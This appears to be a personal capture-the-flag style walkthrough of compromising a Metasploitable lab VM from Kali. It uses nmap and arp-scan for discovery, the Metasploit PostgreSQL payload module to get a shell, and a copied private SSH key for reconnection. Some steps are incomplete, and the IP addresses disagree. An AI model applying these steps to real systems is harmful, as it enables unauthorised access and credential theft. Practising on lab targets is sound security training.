Metasploitable

1. Environment Setup

  • Target: Metasploitable VM
  • Attacker Machine: Kali Linux
  • Changed VM network adapter from NAT to Bridged to ensure both machines are on the same network.

2. Finding the Target IP

After the VM booted, I scanned the local network to identify its IP:

sudo arp-scan -l
nmap -sn <your_ip_range>/24
netdiscover

✅ Result: Target IP found → 192.168.179.139

3. Port & Service Enumeration

Used Nmap to discover open ports and service versions:

nmap -sV 192.168.179.139

📌 Output: Multiple services detected, including the vulnerable POS service.

4. Vulnerability Identification

  • Searched for known exploits for the detected POS service.
  • Found a matching Metasploit module for the service version.

5. Exploitation with Metasploit

  1. Start Metasploit
    msfconsole
  1. Search and select the exploit
    search PostgreSQL DB 8.3.0 - 8.3.7
use exploit/linux/postgres/postgres_payload
  1. Set required options
    set RHOSTS 192.168.179.138
exploit

✅ Exploit was successful — obtained a shell session.

Post-Exploitation Steps

  • Navigated through the file system to locate potential sensitive directories and files.

    /home/msfadmin

  • Entered /home/msfadmin and looked for files/directories containing potentially vulnerable software.
  • Discovered:
    • Samba-related directory

  • Found two versions:

In MySQL-SSL directory:

2. On your local machine (e.g., Kali)

Create a new file and paste the key into it:

nano id_rsa

Paste the copied content, then save and exit.

3. Set the correct file permissions

SSH won’t accept the key if permissions are too open:

chmod 600 id_rsa

4. Connect to the target using the key


ssh -i id_rsa msfadmin@192.168.179.139 => x
ssh -i id_rsa msfadmin@192.168.179.139 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa
